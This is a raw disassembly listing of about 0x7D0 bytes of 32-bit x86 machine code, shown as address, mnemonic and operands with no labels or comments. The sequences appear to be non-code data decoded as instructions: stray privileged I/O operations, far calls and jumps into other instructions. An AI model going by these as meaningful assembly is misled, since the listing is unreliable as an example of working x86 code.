  4137c1:	and    al,BYTE PTR [eax]
  4137c3:	dec    eax
  4137c4:	dec    ecx
  4137c5:	add    ecx,ecx
  4137c7:	and    al,BYTE PTR ds:0x82040012
  4137cd:	add    BYTE PTR [eax],ah
  4137cf:	cwde   
  4137d0:	pop    es
  4137d1:	xor    BYTE PTR [eax],dh
  4137d3:	inc    eax
  4137d4:	and    BYTE PTR [eax],al
  4137d6:	push   ss
  4137d7:	add    DWORD PTR [edx+eiz*2],esp
  4137da:	push   eax
  4137db:	add    eax,0x60204900
  4137e0:	adc    DWORD PTR [eax+0x28a0840],0x3048049
  4137ea:	add    BYTE PTR [eax+0xa],al
  4137ed:	xor    BYTE PTR [ebx],0x23
  4137f0:	and    BYTE PTR [eax],0x0
  4137f3:	push   ss
  4137f4:	or     BYTE PTR [eax],bl
  4137f6:	and    BYTE PTR [eax-0x67e3a3f0],al
  4137fc:	dec    esp
  4137fd:	and    DWORD PTR [ecx],esp
  4137ff:	or     BYTE PTR [eax+0x32122c0c],dl
  413805:	inc    eax
  413806:	sbb    BYTE PTR [edx],0x11
  413809:	aas    
  41380a:	add    al,0x4
  41380c:	push   eax
  41380d:	es in  al,0xc
  413810:	mov    es,WORD PTR [eax+0x18]
  413813:	adc    DWORD PTR [eax],ecx
  413815:	test   al,0x1
  413817:	loopne 0x413799
  413819:	add    al,0x2
  41381b:	or     BYTE PTR [eax-0x47adfafc],dl
  413821:	push   eax
  413822:	ins    BYTE PTR es:[edi],dx
  413823:	sbb    BYTE PTR [ecx+eax*4],dl
  413826:	jb     0x41381a
  413828:	retf   0x9c1
  41382b:	add    eax,0x9d412aa
  413830:	xchg   ecx,eax
  413831:	inc    esp
  413832:	add    BYTE PTR [edi],bl
  413834:	inc    eax
  413835:	or     ch,BYTE PTR [ecx-0x5fdfeb7c]
  41383b:	add    BYTE PTR [ecx+ebp*1+0x60],al
  41383f:	bound  ecx,QWORD PTR [eax]
  413841:	shl    BYTE PTR [eax],0x90
  413844:	and    al,0x80
  413846:	add    bh,BYTE PTR [eax]
  413848:	inc    ecx
  413849:	adc    al,0x11
  41384b:	inc    edx
  41384c:	and    BYTE PTR [esp+ebp*1-0x5d],cl
  413850:	mov    ds:0x501e1000,eax
  413855:	inc    eax
  413856:	xchg   ecx,eax
  413857:	add    eax,0x40800008
  41385c:	or     eax,DWORD PTR [edx]
  41385e:	add    eax,0x19c5435
  413863:	add    BYTE PTR [edx-0x23edcff8],ah
  413869:	mov    ds:0xa0002983,al
  41386e:	add    DWORD PTR [eax+0x19624024],edi
  413874:	add    BYTE PTR [eax+0x8bc033],al
  41387a:	add    BYTE PTR [eax*1-0x750d39ff],al
  413881:	add    BYTE PTR [eax],al
  413883:	add    BYTE PTR [eax],al
  413885:	or     BYTE PTR [eax],al
  413887:	add    al,0x0
  413889:	ss xor al,0x0
  41388c:	and    eax,DWORD PTR [ecx+0x1149446]
  413892:	sbb    DWORD PTR [edi],esp
  413894:	push   ebx
  413895:	sbb    al,0x4
  413897:	and    al,0x32
  413899:	inc    eax
  41389a:	in     al,0x0
  41389c:	or     al,BYTE PTR [eax]
  41389e:	test   BYTE PTR [eax+0x20c1012],al
  4138a4:	add    al,BYTE PTR cs:[ebx+eiz*1]
  4138a8:	mov    al,ds:0x10464844
  4138ad:	add    eax,0x400040
  4138b2:	sbb    al,BYTE PTR [eax]
  4138b4:	sub    BYTE PTR [eax-0x6db7eefd],dl
  4138ba:	adc    eax,DWORD PTR [eax]
  4138bc:	adc    BYTE PTR [eax+ebx*4],al
  4138bf:	push   0x802120c
  4138c4:	test   DWORD PTR [eax],eax
  4138c6:	jecxz  0x413921
  4138c8:	mov    al,fs:0x330c115
  4138ce:	adc    BYTE PTR [eax],al
  4138d0:	and    BYTE PTR [eax-0x3e],bl
  4138d3:	loopne 0x413856
  4138d5:	add    BYTE PTR [ecx+0x141c1087],0x38
  4138dc:	rcl    BYTE PTR [eax],0x0
  4138df:	ror    BYTE PTR [eax],0x4
  4138e2:	mov    BYTE PTR [eax],al
  4138e4:	stc    
  4138e5:	inc    eax
  4138e6:	or     DWORD PTR [eax],edx
  4138e8:	les    eax,FWORD PTR [eax]
  4138ea:	add    BYTE PTR [eax],al
  4138ec:	mov    al,ds:0x42692407
  4138f1:	push   es
  4138f2:	add    ecx,DWORD PTR [eax]
  4138f4:	adc    ecx,DWORD PTR [eax]
  4138f6:	push   eax
  4138f7:	and    eax,DWORD PTR [eax]
  4138f9:	add    al,0x50
  4138fb:	dec    eax
  4138fc:	adc    DWORD PTR [eax],eax
  4138fe:	test   al,0x5
  413900:	add    BYTE PTR [eax+edx*2],al
  413903:	and    BYTE PTR [eax+0x8030006],ah
  413909:	mov    eax,ds:0x100d6108
  41390e:	add    BYTE PTR [eax],0xc0
  413911:	stos   BYTE PTR es:[edi],al
  413912:	or     BYTE PTR [ecx+0x1],al
  413915:	adc    BYTE PTR [ebp+0xa2304],0x9
  41391c:	add    BYTE PTR [eax-0x31badb79],0xac
  413923:	add    BYTE PTR [edx],al
  413925:	add    DWORD PTR [eax-0x7ffdf800],eax
  41392b:	and    eax,0x8000800a
  413930:	push   es
  413931:	add    al,0x0
  413933:	and    BYTE PTR [eax],dl
  413935:	test   BYTE PTR [eax-0x77efdfb0],al
  41393b:	push   es
  41393c:	inc    ecx
  41393d:	add    BYTE PTR [eax],ah
  41393f:	mov    eax,ds:0x21010
  413944:	and    BYTE PTR [ecx],al
  413946:	ret    0x3000
  413949:	add    al,0x1
  41394b:	add    DWORD PTR [eax],eax
  41394d:	add    BYTE PTR [eax],ah
  41394f:	xor    al,0x59
  413951:	sub    BYTE PTR [eax-0x7f],ah
  413954:	inc    esi
  413955:	inc    eax
  413956:	add    al,0x0
  413958:	mov    ebx,0x414ac45a
  41395d:	add    BYTE PTR [ecx],bl
  41395f:	mov    eax,0x5a650090
  413964:	mov    BYTE PTR [eax+0x24624880],al
  41396a:	add    BYTE PTR [ecx-0x75c7e700],dl
  413970:	push   ebp
  413971:	inc    esp
  413972:	cmp    dl,dl
  413974:	dec    ecx
  413975:	and    al,0x2
  413977:	add    BYTE PTR [edi+0x4162072c],0xac
  41397e:	mov    al,BYTE PTR [ecx+ecx*1+0x0]
  413982:	dec    eax
  413983:	add    BYTE PTR [eax],al
  413985:	add    cl,BYTE PTR [ecx]
  413987:	inc    eax
  413988:	adc    eax,0x30ed823
  41398d:	adc    BYTE PTR [ebx],0x20
  413990:	mov    BYTE PTR [ebp+ebp*1+0x225012c0],bl
  413997:	pushf  
  413998:	lds    ecx,FWORD PTR [ecx-0x7f]
  41399b:	or     BYTE PTR [ecx],ah
  41399d:	add    BYTE PTR [eax-0x80],al
  4139a0:	and    BYTE PTR [eax+0x9],0x25
  4139a4:	sub    BYTE PTR [ebp+esi*8+0x2c74c829],dl
  4139ab:	rcl    BYTE PTR [ebx],1
  4139ad:	add    BYTE PTR [eax],cl
  4139af:	adc    BYTE PTR [eax+edx*1],bh
  4139b2:	or     BYTE PTR [eax],al
  4139b4:	inc    ecx
  4139b5:	push   ss
  4139b6:	push   esi
  4139b7:	or     DWORD PTR [ecx+0x73],ebx
  4139ba:	or     BYTE PTR [edx],al
  4139bc:	pusha  
  4139bd:	and    DWORD PTR [eax+0x405a9217],0x89900060
  4139c7:	add    DWORD PTR [eax],0xffffff98
  4139ca:	push   0xffffff84
  4139cc:	dec    eax
  4139cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139ce:	les    eax,FWORD PTR [eax]
  4139d0:	add    BYTE PTR [edx],dl
  4139d2:	add    DWORD PTR [ecx-0x80],eax
  4139d5:	les    eax,FWORD PTR [eax-0x80]
  4139d8:	mov    eax,ds:0x161981
  4139dd:	cmp    BYTE PTR [eax+0x1013180c],dh
  4139e3:	sub    BYTE PTR [ebx+0x22],al
  4139e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139e7:	cmp    al,dl
  4139e9:	add    al,0x0
  4139eb:	add    DWORD PTR [edx],eax
  4139ed:	adc    al,dl
  4139ef:	test   BYTE PTR [eax+0x20244d2d],al
  4139f5:	add    BYTE PTR [eax],ah
  4139f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4139f8:	adc    al,0x18
  4139fa:	add    BYTE PTR [ecx],al
  4139fc:	ins    DWORD PTR es:[edi],dx
  4139fd:	and    DWORD PTR [esp+eax*1],0x2
  413a01:	push   esp
  413a02:	shl    DWORD PTR [eax+ecx*1],0x18
  413a06:	or     DWORD PTR [eax-0x7f1efd00],eax
  413a0c:	or     BYTE PTR [edx-0x5f],cl
  413a0f:	sub    DWORD PTR [edx],esp
  413a11:	add    BYTE PTR [eax+0x4604910],dl
  413a17:	or     BYTE PTR [ecx+0x14608586],ch
  413a1d:	add    dl,BYTE PTR [eax+0x1022204a]
  413a23:	inc    eax
  413a24:	sbb    BYTE PTR [edx],al
  413a26:	push   0x4401ab04
  413a2b:	and    edi,esp
  413a2d:	adc    eax,ebp
  413a2f:	inc    edx
  413a30:	add    BYTE PTR [eax+edx*1],0x4
  413a34:	push   es
  413a35:	pusha  
  413a36:	or     BYTE PTR [eax],dh
  413a38:	adc    bl,BYTE PTR [edx]
  413a3a:	sub    BYTE PTR ds:0x74340499,al
  413a40:	mov    al,ds:0x22a8802a
  413a45:	and    BYTE PTR [edx],cl
  413a47:	add    BYTE PTR [ecx+0x4],al
  413a4a:	leave  
  413a4b:	add    BYTE PTR [eax+0x44],0x41
  413a4f:	add    DWORD PTR [eax+0x8662a01],0x86469000
  413a59:	inc    ecx
  413a5a:	xchg   ecx,eax
  413a5b:	adc    BYTE PTR [eax+eax*1+0x11e04248],0xa
  413a63:	add    al,0x14
  413a65:	add    BYTE PTR [eax],al
  413a67:	data16 or BYTE PTR [eax+0x2814cbd],cl
  413a6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a6f:	int3   
  413a70:	add    BYTE PTR [eax+0x49060020],ah
  413a76:	inc    eax
  413a77:	rol    BYTE PTR [edx+0x8],0xc0
  413a7b:	adc    BYTE PTR [ebx+0x11],al
  413a7e:	mov    al,0x0
  413a80:	or     bl,BYTE PTR [eax]
  413a82:	add    BYTE PTR [eax],cl
  413a84:	and    ah,BYTE PTR ds:0xa880602
  413a8a:	xchg   esi,eax
  413a8b:	add    al,BYTE PTR [eax]
  413a8d:	lar    edx,WORD PTR [ebx]
  413a90:	adc    ebp,DWORD PTR [ecx]
  413a92:	inc    eax
  413a93:	adc    BYTE PTR [eax],cl
  413a95:	mov    al,0x2
  413a97:	inc    esi
  413a98:	xchg   esp,eax
  413a99:	add    eax,0x70405420
  413a9e:	or     al,0x20
  413aa0:	add    DWORD PTR [ecx],edx
  413aa2:	inc    eax
  413aa3:	and    BYTE PTR [edx+ebx*1+0x70],0xd2
  413aa8:	popa   
  413aa9:	and    DWORD PTR [ecx],eax
  413aab:	add    BYTE PTR ds:0x10040acc,cl
  413ab1:	sub    BYTE PTR [ebx+eax*1+0x1388469],bl
  413ab8:	add    BYTE PTR [eax],al
  413aba:	or     eax,DWORD PTR [edx]
  413abc:	pusha  
  413abd:	and    cl,0x0
  413ac0:	add    ah,BYTE PTR [ebp+0x7401024]
  413ac6:	adc    BYTE PTR [ecx+edx*1],dl
  413ac9:	and    ecx,esp
  413acb:	and    BYTE PTR [esi],0xd0
  413ace:	push   ecx
  413acf:	ret    0x24
  413ad2:	sbb    BYTE PTR [ecx+0x5b82209],bl
  413ad8:	les    eax,FWORD PTR [eax+0x8190236]
  413ade:	add    BYTE PTR [ecx+edx*4],ah
  413ae1:	add    eax,0x638100
  413ae6:	add    BYTE PTR [eax],dl
  413ae8:	aam    0x27
  413aea:	add    BYTE PTR [eax],0x80
  413aed:	add    eax,DWORD PTR [edx-0x60]
  413af0:	dec    edx
  413af1:	or     BYTE PTR [esi],0x98
  413af4:	and    al,ah
  413af6:	and    al,BYTE PTR [edi]
  413af8:	or     BYTE PTR [eax+0x20207462],al
  413afe:	rol    BYTE PTR [ebp+0x802088c],cl
  413b04:	add    BYTE PTR [edi],0x80
  413b07:	add    dl,0x4
  413b0a:	adc    esp,DWORD PTR [eax]
  413b0c:	add    BYTE PTR [esi],al
  413b0e:	or     BYTE PTR [eax],dh
  413b10:	push   ecx
  413b11:	add    al,0x40
  413b13:	inc    esp
  413b14:	add    BYTE PTR [eax+0x20010033],cl
  413b1a:	rol    BYTE PTR [edi+eax*4],0x18
  413b1e:	dec    ebx
  413b1f:	or     BYTE PTR [ecx],0x5
  413b22:	rol    al,0x60
  413b25:	sbb    BYTE PTR [ecx],0xeb
  413b28:	adc    BYTE PTR [eax-0x80],bl
  413b2b:	jae    0x413b3a
  413b2d:	adc    DWORD PTR [eax+0x4a],ecx
  413b30:	add    BYTE PTR [ebp+0x58244500],0x8
  413b37:	add    dh,al
  413b39:	add    dl,BYTE PTR [edx]
  413b3b:	loop   0x413b5f
  413b3d:	dec    eax
  413b3e:	add    DWORD PTR [eax+0x42235201],ebp
  413b44:	dec    eax
  413b45:	adc    eax,esp
  413b47:	add    BYTE PTR [eax+0x15],ch
  413b4a:	sub    BYTE PTR [eax],dl
  413b4c:	add    DWORD PTR [eax+0x419a161d],esi
  413b52:	call   0x214:0x40502000
  413b59:	dec    eax
  413b5a:	enter  0x240a,0x60
  413b5e:	sbb    dl,BYTE PTR [eax+0x61840502]
  413b64:	popa   
  413b65:	rcl    BYTE PTR [eax],0x19
  413b68:	xor    BYTE PTR [eax+eiz*1],dl
  413b6b:	or     al,0x82
  413b6d:	js     0x413b71
  413b6f:	add    cl,BYTE PTR [eax+0x12]
  413b72:	mov    DWORD PTR [eax-0x7f4ff27b],0x80c8841
  413b7c:	add    BYTE PTR [esi],al
  413b7e:	and    BYTE PTR [eax+0x415001fc],al
  413b84:	add    DWORD PTR [eax],ebx
  413b86:	lods   eax,DWORD PTR ds:[esi]
  413b87:	add    al,BYTE PTR [eax]
  413b89:	inc    eax
  413b8a:	add    DWORD PTR [eax-0x3f],ecx
  413b8d:	add    BYTE PTR cs:[eax+0x50],0x2
  413b92:	inc    eax
  413b93:	sub    DWORD PTR [eax+0x1],esp
  413b96:	mov    al,ds:0x8008941
  413b9b:	inc    eax
  413b9c:	lods   al,BYTE PTR ds:[esi]
  413b9d:	add    al,BYTE PTR [eax]
  413b9f:	and    ah,BYTE PTR [edx+0x70000a00]
  413ba5:	adc    ebx,DWORD PTR [eax-0x40]
  413ba8:	add    al,0x0
  413baa:	inc    esp
  413bab:	and    BYTE PTR [eax+0x10],dl
  413bae:	and    BYTE PTR [edi-0x7eb9ffd8],0x1
  413bb5:	adc    al,BYTE PTR [ecx+ebx*1]
  413bb8:	add    DWORD PTR [eax+0x2000613a],ecx
  413bbe:	or     al,BYTE PTR [esi]
  413bc0:	add    BYTE PTR [esp+ecx*2],dh
  413bc3:	add    BYTE PTR [eax+0x17b86202],cl
  413bc9:	mov    BYTE PTR [ecx],al
  413bcb:	and    BYTE PTR [eax+0x0],0x71
  413bcf:	mov    al,0x4
  413bd1:	add    cl,BYTE PTR [edx]
  413bd3:	or     BYTE PTR [ebx-0x6effbd60],cl
  413bd9:	and    al,BYTE PTR [ecx+0x4b]
  413bdc:	add    BYTE PTR ds:0x866c0b68,ch
  413be2:	test   BYTE PTR [edx],al
  413be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413be5:	js     0x413bf7
  413be7:	or     BYTE PTR [eax+ecx*4+0x200a5020],0x20
  413bef:	scas   al,BYTE PTR es:[edi]
  413bf0:	or     BYTE PTR [eax],dl
  413bf2:	add    DWORD PTR [eax],ebp
  413bf4:	or     eax,DWORD PTR [eax+0x24]
  413bf7:	or     BYTE PTR [edi+0x44],cl
  413bfa:	sub    BYTE PTR [eax+0x3],0x20
  413bfe:	add    cl,BYTE PTR [eax]
  413c00:	pusha  
  413c01:	inc    ebp
  413c02:	mov    es,WORD PTR [edx+0x65]
  413c05:	add    al,0x8d
  413c07:	and    DWORD PTR [esi-0x7f77f7de],edx
  413c0d:	clc    
  413c0e:	fidivr DWORD PTR [eax]
  413c10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c11:	or     BYTE PTR [eax],0x1b
  413c14:	add    eax,DWORD PTR [eax+eax*1]
  413c17:	and    BYTE PTR [edx],ah
  413c19:	mov    al,ds:0xe44060c8
  413c1e:	jb     0x413c34
  413c20:	inc    esp
  413c21:	or     eax,0x29013044
  413c26:	or     BYTE PTR [eax+0x31],cl
  413c29:	inc    edx
  413c2a:	add    ah,al
  413c2c:	and    BYTE PTR [ebx],cl
  413c2e:	add    al,0x29
  413c30:	rol    BYTE PTR [eax+0x24],1
  413c33:	add    BYTE PTR [eax+edx*2],al
  413c36:	bound  eax,QWORD PTR [eax-0x27]
  413c39:	add    dl,cl
  413c3b:	and    BYTE PTR [edx],dl
  413c3d:	or     BYTE PTR [ecx],dl
  413c3f:	add    BYTE PTR [eax],al
  413c41:	or     BYTE PTR [ecx],dl
  413c43:	sub    BYTE PTR [ecx+0x12605295],ah
  413c49:	ror    al,0x4a
  413c4c:	adc    BYTE PTR [esi],cl
  413c4e:	inc    esp
  413c4f:	shl    BYTE PTR [ebx],0x8a
  413c52:	add    BYTE PTR [ecx+0x60],al
  413c55:	inc    edx
  413c56:	push   0x5
  413c58:	pop    es
  413c59:	mov    eax,ds:0x21a80140
  413c5e:	ret    0x4806
  413c61:	data16 or cl,0x1
  413c65:	shl    BYTE PTR [ebx+0x70],0xc0
  413c69:	push   es
  413c6a:	add    BYTE PTR [edi],al
  413c6c:	mov    al,ds:0x182674
  413c71:	or     BYTE PTR [eax],0x38
  413c74:	add    al,ch
  413c76:	and    BYTE PTR [edx],cl
  413c78:	dec    esp
  413c79:	or     al,0x40
  413c7b:	push   eax
  413c7c:	and    BYTE PTR [edx],ah
  413c7e:	add    DWORD PTR [edi+0x10812d13],esp
  413c84:	sbb    BYTE PTR [ecx+eiz*2+0x12],ah
  413c88:	add    BYTE PTR [eax],dl
  413c8a:	inc    eax
  413c8b:	add    al,0x4
  413c8d:	add    al,0x2
  413c90:	add    BYTE PTR ds:0x48500005,cl
  413c96:	cwde   
  413c97:	cmp    BYTE PTR fs:[ebx+0x0],0xa4
  413c9c:	popa   
  413c9d:	add    eax,0x45a310
  413ca2:	inc    ecx
  413ca3:	cmp    cl,BYTE PTR [eax+0x5]
  413ca6:	ins    DWORD PTR es:[edi],dx
  413ca7:	or     BYTE PTR [ecx+0x180160],al
  413cad:	add    BYTE PTR [edx+eax*1],al
  413cb0:	xchg   edx,eax
  413cb1:	add    DWORD PTR [eax+0x4109220c],ecx
  413cb7:	sbb    BYTE PTR [edx+0x20048e0],cl
  413cbd:	add    BYTE PTR [edx+0x1b],ah
  413cc0:	mov    ecx,0xcd804812
  413cc5:	inc    edx
  413cc6:	or     BYTE PTR [eax],ah
  413cc8:	and    DWORD PTR [esi+0x29],esi
  413ccb:	add    DWORD PTR [eax+0x4808059],esp
  413cd1:	and    BYTE PTR [edx+edx*1-0x78],al
  413cd5:	mov    ch,BYTE PTR [eax]
  413cd7:	or     BYTE PTR [edx],dl
  413cd9:	and    al,0x55
  413cdb:	add    al,0x42
  413cdd:	enter  0x5171,0x84
  413ce1:	adc    DWORD PTR [eax],eax
  413ce3:	adc    BYTE PTR [ecx+0x0],ah
  413ce6:	pop    eax
  413ce7:	mov    eax,ds:0x4203211c
  413cec:	or     al,0x24
  413cee:	inc    eax
  413cef:	inc    edx
  413cf0:	add    ch,BYTE PTR [eax]
  413cf2:	add    DWORD PTR [eax],eax
  413cf4:	xor    dl,BYTE PTR [esp+eax*2]
  413cf7:	cmp    BYTE PTR [eax],dl
  413cf9:	push   cs
  413cfa:	dec    ebp
  413cfb:	imul   eax,DWORD PTR [eax-0x4f9cf5d7],0x102d034
  413d05:	add    DWORD PTR [eax],edx
  413d07:	adc    BYTE PTR [edx+eiz*4+0x42],ah
  413d0b:	pop    eax
  413d0c:	sub    BYTE PTR [eax+0x58],al
  413d0f:	add    al,0x40
  413d11:	adc    DWORD PTR [eax+esi*1],eax
  413d14:	add    DWORD PTR [ebp-0x7efd69c8],eax
  413d1a:	adc    dl,dl
  413d1c:	add    al,0x0
  413d1e:	and    al,0x0
  413d20:	or     DWORD PTR [ecx],ebx
  413d22:	and    eax,DWORD PTR [eax+0x5]
  413d25:	add    DWORD PTR [eax+0x24],eax
  413d28:	adc    eax,0x12a010
  413d2d:	and    cl,BYTE PTR [eax+0xa042886]
  413d33:	add    BYTE PTR [eax+0x24],al
  413d36:	xor    BYTE PTR [ecx],dl
  413d38:	mov    al,ds:0x601000a8
  413d3d:	add    eax,0xe058408
  413d42:	outs   dx,BYTE PTR ds:[esi]
  413d43:	add    BYTE PTR [edx+0x1a],dl
  413d46:	sbb    BYTE PTR [eax+ecx*4+0x62e21082],al
  413d4d:	push   esp
  413d4e:	xor    DWORD PTR [edx+eax*4+0x14200010],edx
  413d55:	inc    eax
  413d56:	add    al,0xc0
  413d58:	adc    BYTE PTR [ecx+0x64026123],al
  413d5e:	add    al,0x40
  413d60:	inc    eax
  413d61:	add    BYTE PTR [ecx+eax*1+0x3],al
  413d65:	add    BYTE PTR [eax+eax*1-0x7e],ah
  413d69:	add    DWORD PTR [eax+0x1188100],0xffffffa0
  413d70:	or     BYTE PTR ds:0x1e30415,al
  413d76:	and    DWORD PTR [ebx+eax*4],0xc7206841
  413d7d:	adc    eax,0x441a4064
  413d82:	adc    dh,BYTE PTR [eax+0x2830c242]
  413d88:	or     BYTE PTR [eax],ah
  413d8a:	sbb    DWORD PTR [edx],ecx
  413d8c:	inc    ecx
  413d8d:	inc    esp
  413d8e:	and    al,0x81
  413d90:	bound  ecx,QWORD PTR [edx+0x50804440]
  413d96:	adc    BYTE PTR [eax+edx*2],cl
  413d99:	add    al,BYTE PTR [eax]
  413d9b:	mov    al,ds:0x212
  413da0:	mov    dl,0x85
  413da2:	add    DWORD PTR [ecx+0x4],ecx
  413da5:	add    DWORD PTR [eax+eax*4],esp
  413da8:	adc    DWORD PTR [ecx+0x10],edx
  413dab:	and    al,BYTE PTR [ecx+edx*1+0x59]
  413daf:	push   eax
  413db0:	add    BYTE PTR [eax],dl
  413db2:	pop    ss
  413db3:	mov    al,ds:0x80840a88
  413db8:	adc    esp,DWORD PTR [eax]
  413dba:	or     BYTE PTR [eax+0xd000d8],cl
  413dc0:	mov    al,BYTE PTR [eax]
  413dc2:	bound  eax,QWORD PTR [eax+ecx*2]
  413dc5:	add    BYTE PTR [edx+0x1c211293],cl
  413dcb:	inc    ecx
  413dcc:	add    BYTE PTR [eax+0x41],al
  413dcf:	add    al,0x58
  413dd1:	or     al,BYTE PTR [eax]
  413dd3:	adc    al,0x34
  413dd5:	ret    
  413dd6:	add    eax,0x39c92400
  413ddb:	adc    DWORD PTR [eax+0x20],eax
  413dde:	sbb    BYTE PTR [eax],ah
  413de0:	xchg   ecx,eax
  413de1:	sub    al,0x40
  413de3:	rol    DWORD PTR [edx],1
  413de5:	add    BYTE PTR [eax],al
  413de7:	add    DWORD PTR [eax-0x40],edx
  413dea:	cmp    al,0x40
  413dec:	and    BYTE PTR [ecx],al
  413dee:	mov    eax,ds:0xc0e05608
  413df3:	or     BYTE PTR [eax+0x13019a08],al
  413df9:	mov    eax,ds:0x390cd812
  413dfe:	inc    ebp
  413dff:	test   BYTE PTR [ecx+0x35],al
  413e02:	xor    BYTE PTR [eax],bl
  413e04:	add    cl,BYTE PTR [eax]
  413e06:	and    al,BYTE PTR [eax]
  413e08:	jo     0x413e0a
  413e0a:	mov    DWORD PTR [ecx],edx
  413e0c:	mov    al,ds:0x108091a0
  413e11:	add    BYTE PTR [edx],al
  413e13:	inc    ecx
  413e14:	adc    DWORD PTR [ecx+eax*1],ecx
  413e17:	xchg   ecx,eax
  413e18:	adc    ah,BYTE PTR [eax+0x24]
  413e1b:	and    al,0x24
  413e1d:	and    BYTE PTR [eax+0x204c113],ah
  413e23:	inc    ecx
  413e24:	nop
  413e25:	or     BYTE PTR [ecx+0x0],ah
  413e28:	add    BYTE PTR [eax],0x48
  413e2b:	add    DWORD PTR fs:[ecx+0x5024860],eax
  413e32:	and    DWORD PTR [ebx],edx
  413e34:	and    DWORD PTR [ecx],edx
  413e36:	mov    WORD PTR [eax+0x29322850],es
  413e3c:	add    ah,BYTE PTR [eax]
  413e3e:	sbb    DWORD PTR [eax],esp
  413e40:	in     al,0x30
  413e42:	add    DWORD PTR [edx],eax
  413e44:	or     ecx,DWORD PTR [eax+eax*2]
  413e47:	or     BYTE PTR [eax],bh
  413e49:	sub    al,BYTE PTR [eax]
  413e4b:	add    DWORD PTR ds:0x34862108,eax
  413e51:	push   es
  413e52:	adc    al,0x81
  413e54:	fs dec esp
  413e56:	add    al,BYTE PTR [eax-0x3e7eff7f]
  413e5c:	mov    dl,0x3
  413e5e:	imul   ecx,DWORD PTR [eax],0x49
  413e61:	add    BYTE PTR [edx+0x40308139],0xe2
  413e68:	mov    al,ds:0xa03c0a43
  413e6d:	and    BYTE PTR [edx],0x23
  413e70:	adc    DWORD PTR [ebx+0x407930],esp
  413e76:	mov    WORD PTR [eax],es
  413e78:	adc    al,0x20
  413e7a:	cmp    DWORD PTR [edx],ecx
  413e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e7d:	xor    BYTE PTR [ecx],ch
  413e7f:	sub    BYTE PTR [edx+ecx*2],al
  413e82:	add    BYTE PTR [edx],ah
  413e84:	add    BYTE PTR [eax],al
  413e86:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e87:	inc    eax
  413e88:	jecxz  0x413e95
  413e8a:	nop
  413e8b:	push   eax
  413e8c:	or     al,BYTE PTR [edi+ecx*1]
  413e8f:	pop    eax
  413e90:	adc    eax,DWORD PTR [edx+edx*2+0x101482]
  413e97:	or     BYTE PTR [eax+ebp*2],0x26
  413e9b:	push   es
  413e9c:	inc    eax
  413e9d:	sbb    DWORD PTR [edx],0x0
  413ea0:	push   es
  413ea1:	or     BYTE PTR [ebx+eiz*8],al
  413ea4:	xor    BYTE PTR [eax],al
  413ea6:	rol    BYTE PTR [esp+eax*2],0x0
  413eaa:	add    bl,BYTE PTR [eax]
  413eac:	mov    ds:0xc8042101,eax
  413eb1:	or     BYTE PTR [eax],cl
  413eb3:	mov    BYTE PTR [eax],al
  413eb5:	add    BYTE PTR [eax],al
  413eb7:	adc    BYTE PTR [eax],al
  413eb9:	sub    cl,BYTE PTR [ecx+0x20401002]
  413ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec0:	inc    ecx
  413ec1:	cdq    
  413ec2:	add    eax,0xf0328107
  413ec7:	add    DWORD PTR [eax],eax
  413ec9:	pop    es
  413eca:	add    BYTE PTR ds:0x4e8a220a,al
  413ed0:	sbb    al,0x28
  413ed2:	adc    BYTE PTR [eax],al
  413ed4:	sbb    dl,BYTE PTR [eax+0x41]
  413ed7:	add    al,0x1c
  413ed9:	or     al,0x20
  413edb:	or     al,0x40
  413edd:	nop
  413ede:	inc    eax
  413edf:	add    BYTE PTR [eax],ah
  413ee1:	inc    esp
  413ee2:	add    al,0x2
  413ee4:	xor    cl,BYTE PTR [eax+0x61]
  413ee7:	and    BYTE PTR [esp+eiz*2],0xa2
  413eeb:	test   DWORD PTR [eax],edx
  413eed:	inc    ecx
  413eee:	and    cl,ah
  413ef0:	adc    BYTE PTR [eax+0xa100900],al
  413ef6:	adc    BYTE PTR [eax+0x24],dh
  413ef9:	add    BYTE PTR [edx-0xdf3bc0],0x15
  413f00:	xchg   esp,eax
  413f01:	pop    ebx
  413f02:	inc    ebx
  413f03:	add    BYTE PTR [ecx],al
  413f05:	add    DWORD PTR [edx],ecx
  413f07:	les    edx,FWORD PTR ds:0x414e004
  413f0d:	inc    edx
  413f0e:	ror    DWORD PTR [ebx],0x0
  413f11:	add    BYTE PTR [edx-0x70],ah
  413f14:	add    BYTE PTR [esi+eax*1+0x43],ah
  413f18:	add    BYTE PTR [edx+0x0],0x20
  413f1c:	push   esi
  413f1d:	sbb    al,0x81
  413f1f:	or     BYTE PTR [edx],al
  413f21:	add    BYTE PTR [eax],0x6
  413f24:	add    DWORD PTR [eax+0x44],ecx
  413f27:	xor    eax,0x4410a010
  413f2c:	add    BYTE PTR [edi],cl
  413f2e:	imul   ecx,DWORD PTR [edx],0x84602100
  413f34:	pusha  
  413f35:	or     al,BYTE PTR [eax+ecx*2+0x1ab2045a]
  413f3c:	nop
  413f3d:	xor    al,0x22
  413f3f:	and    BYTE PTR [ecx+0x48],0x5c
  413f43:	push   es
  413f44:	and    DWORD PTR [edx],ebx
  413f46:	or     BYTE PTR [esi-0x34],al
  413f49:	or     BYTE PTR [eax+0x8001654],0x8
  413f50:	or     al,BYTE PTR [edx+0xb020560]
  413f56:	adc    al,0x44
  413f58:	and    BYTE PTR ds:0x2182ca00,0x0
  413f5f:	add    cl,dl
  413f61:	inc    edx
  413f62:	or     BYTE PTR [ecx],0x1
  413f65:	add    al,0x50
  413f67:	mov    BYTE PTR ds:0x80808444,cl
  413f6d:	sbb    cl,BYTE PTR [eax+0x0]
  413f70:	adc    al,0xa
  413f72:	sbb    BYTE PTR [eax],cl
  413f74:	add    BYTE PTR [edx],0x40
  413f77:	add    al,cl
  413f79:	mov    al,ds:0xc8010c41
  413f7e:	rcl    DWORD PTR [ebx+eax*1],0x0
  413f82:	mov    al,BYTE PTR [ecx]
  413f84:	and    BYTE PTR [edx],al
  413f86:	inc    esp
  413f87:	inc    eax
  413f88:	rol    BYTE PTR [eax+0x40bb61],0x2a
  413f8f:	mov    BYTE PTR [eax],cl
  413f91:	inc    ebp
